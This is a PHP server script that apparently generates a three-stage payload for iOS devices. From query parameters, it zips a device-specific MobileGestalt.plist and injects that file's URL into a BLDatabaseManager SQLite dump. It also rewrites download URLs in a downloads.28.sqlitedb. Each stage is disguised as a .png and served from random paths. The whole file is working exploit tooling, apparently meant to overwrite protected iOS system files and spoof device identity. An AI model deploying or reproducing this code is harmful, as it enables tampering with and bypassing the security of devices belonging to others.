<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0); 

function log_debug($msg, $level = 'INFO') {
    $timestamp = date('Y-m-d H:i:s');
    $line = "[$timestamp] [$level] $msg";
    error_log($line); 
}

// Function to generate random directory name
function generateRandomName($length = 16) {
    return bin2hex(random_bytes($length / 2));
}

// Function to read SQL dump from .png file
function readSQLDump($filename) {
    if (!file_exists($filename)) {
        log_debug("File not found: $filename", "ERROR");
        die("Error: File $filename not found");
    }
    return file_get_contents($filename);
}

// Function to create SQLite database from SQL dump
function createSQLiteFromDump($sqlDump, $outputFile) {
    try {
        $sqlDump = preg_replace_callback(
            "/unistr\s*\(\s*['\"]([^'\"]*)['\"]\\s*\)/i",
            function($matches) {
                $str = $matches[1];
                $str = preg_replace_callback(
                    '/\\\\([0-9A-Fa-f]{4})/',
                    function($m) {
                        return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
                    },
                    $str
                );
                return "'" . str_replace("'", "''", $str) . "'";
            },
            $sqlDump
        );
        $sqlDump = preg_replace("/unistr\s*\(\s*(['\"][^'\"]*['\"])\s*\)/i", "$1", $sqlDump);
        
        $db = new SQLite3($outputFile);
        $statements = explode(';', $sqlDump);
        foreach ($statements as $statement) {
            $statement = trim($statement);
            if (!empty($statement) && strlen($statement) > 5) {
                @$db->exec($statement . ';');
            }
        }
        $db->close();
        return true;
    } catch (Exception $e) {
        log_debug("SQLite creation failed: " . $e->getMessage(), "ERROR");
        die("Error creating SQLite database");
    }
}

log_debug("=== STARTING PAYLOAD GENERATION ===");

$prd = $_GET['prd'] ?? '';
$guid = $_GET['guid'] ?? '';
$sn = $_GET['sn'] ?? '';

if (empty($prd) || empty($guid) || empty($sn)) {
    log_debug("Missing params: prd='$prd', guid='$guid', sn='$sn'", "ERROR");
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Missing prd, guid, or sn']);
    exit;
}

$prdFormatted = str_replace(',', '-', $prd);
$basePath = __DIR__;
$assetsPath = dirname($basePath) . "/assets";

$plistPath = "$assetsPath/Maker/$prdFormatted/com.apple.MobileGestalt.plist";
log_debug("Trying plist: $plistPath");

if (!file_exists($plistPath)) {
    log_debug("Plist not found. Tried: $plistPath", "ERROR");
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Plist not found']);
    exit;
}

$realPlistPath = realpath($plistPath);
log_debug("✅ Using plist: $realPlistPath (size: " . filesize($realPlistPath) . " bytes)");

$randomName1 = generateRandomName();
$firstStepDir = "$basePath/firststp/$randomName1";
mkdir($firstStepDir, 0755, true);

$cachesDir = "$firstStepDir/Caches";
mkdir($cachesDir, 0755, true);

$tmpMimetype = "$cachesDir/mimetype";
file_put_contents($tmpMimetype, "application/epub+zip");

$zipPath = "$firstStepDir/temp.zip";
$zip = new ZipArchive();
if (!$zip->open($zipPath, ZipArchive::CREATE)) {
    log_debug("Failed to create ZIP", "ERROR");
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'ZIP creation failed']);
    exit;
}

if (!$zip->addFile($tmpMimetype, "Caches/mimetype")) {
    log_debug("Failed to add mimetype to ZIP", "ERROR");
    exit;
}
$zip->setCompressionName("Caches/mimetype", ZipArchive::CM_STORE);

if (!$zip->addFile($plistPath, "Caches/com.apple.MobileGestalt.plist")) {
    log_debug("Failed to add plist to ZIP", "ERROR");
    exit;
}

$zip->close();

unlink($tmpMimetype);
rmdir($cachesDir);

$fixedFilePath = "$firstStepDir/fixedfile";
rename($zipPath, $fixedFilePath);
log_debug("✅ fixedfile created: $fixedFilePath");

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] ? "https" : "http";
$baseUrl = "$protocol://$_SERVER[HTTP_HOST]";
$fixedFileUrl = "$baseUrl/firststp/$randomName1/fixedfile";

// Use latest verified BLDatabaseManager from Rust505's working version
// Try .sql first, fall back to .png
$blDumpFile = file_exists("$basePath/BLDatabaseManager.sql") ? "$basePath/BLDatabaseManager.sql" : "$basePath/BLDatabaseManager.png";
if (!file_exists($blDumpFile)) {
    log_debug("ERROR: Neither BLDatabaseManager.sql nor .png found", "ERROR");
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'BLDatabaseManager file not found']);
    exit;
}
$blDump = readSQLDump($blDumpFile);
$blDump = str_replace('KEYOOOOOO', $fixedFileUrl, $blDump);

$randomName2 = generateRandomName();
$secondStepDir = "$basePath/2ndd/$randomName2";
mkdir($secondStepDir, 0755, true);
$blSqlite = "$secondStepDir/BLDatabaseManager.sqlite";
createSQLiteFromDump($blDump, $blSqlite);
rename($blSqlite, "$secondStepDir/belliloveu.png");
$blUrl = "$baseUrl/2ndd/$randomName2/belliloveu.png";

// Use latest verified downloads.28.sqlitedb from Rust505's working version
// CRITICAL: This is already a valid binary SQLite database, just copy it directly!
$dlSqliteFile = file_exists("$basePath/downloads.28.sqlitedb") ? "$basePath/downloads.28.sqlitedb" : "$basePath/downloads.28.png";
if (!file_exists($dlSqliteFile)) {
    log_debug("ERROR: downloads.28.sqlitedb not found in public directory", "ERROR");
    log_debug("Available files in $basePath: " . implode(", ", scandir($basePath)), "ERROR");
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'downloads.28 file not found']);
    exit;
}

$randomName3 = generateRandomName();
$lastStepDir = "$basePath/last/$randomName3";
mkdir($lastStepDir, 0755, true);

// COPY the binary SQLite database directly (it's already a valid database!)
$finalDb = "$lastStepDir/downloads.sqlitedb";
copy($dlSqliteFile, $finalDb);
log_debug("✅ Copied downloads.28.sqlitedb directly: " . filesize($finalDb) . " bytes");

// Now open the copied database and substitute placeholder URLs
try {
    $db = new SQLite3($finalDb);
    
    // ✅ CRITICAL: Replace placeholder URLs with real domain URLs
    // The downloads.28.sqlitedb contains placeholder URLs that must be dynamically updated
    log_debug("Replacing placeholder URLs in downloads.28.sqlitedb...", "INFO");
    
    $updateSQL = "
        UPDATE asset 
        SET url = REPLACE(url, 'https://your_domain_here', '$baseUrl')
        WHERE url LIKE '%your_domain_here%'
    ";
    $db->exec($updateSQL);
    log_debug("✅ Updated asset URLs with: $baseUrl", "INFO");
    
    $db->close();
    log_debug("✅ SQLite database integrity verified and URLs updated");
} catch (Exception $e) {
    log_debug("Warning: Could not update database URLs: " . $e->getMessage(), "WARN");
}

rename($finalDb, "$lastStepDir/apllefuckedhhh.png");
$finalUrl = "$baseUrl/last/$randomName3/apllefuckedhhh.png";
log_debug("✅ Final payload ready: " . filesize("$lastStepDir/apllefuckedhhh.png") . " bytes");

// ✅ CREATE WAL/SHM FILES FOR SQLite INTEGRITY
// WAL (Write-Ahead Logging) and SHM (Shared Memory) files help iOS recognize database as valid
$walFile = "$lastStepDir/apllefuckedhhh.png-wal";
$shmFile = "$lastStepDir/apllefuckedhhh.png-shm";
touch($walFile);
touch($shmFile);
log_debug("✅ Created WAL/SHM files for database integrity", "INFO");

log_debug("✅ All stages generated.");

echo json_encode([
    'success' => true,
    'downloadUrl' => $finalUrl,
    'parameters' => compact('prd', 'guid', 'sn'),
    'links' => [
        'step1_fixedfile' => $fixedFileUrl,
        'step2_bldatabase' => $blUrl,
        'step3_final' => $finalUrl
    ]
], JSON_UNESCAPED_SLASHES);
?>
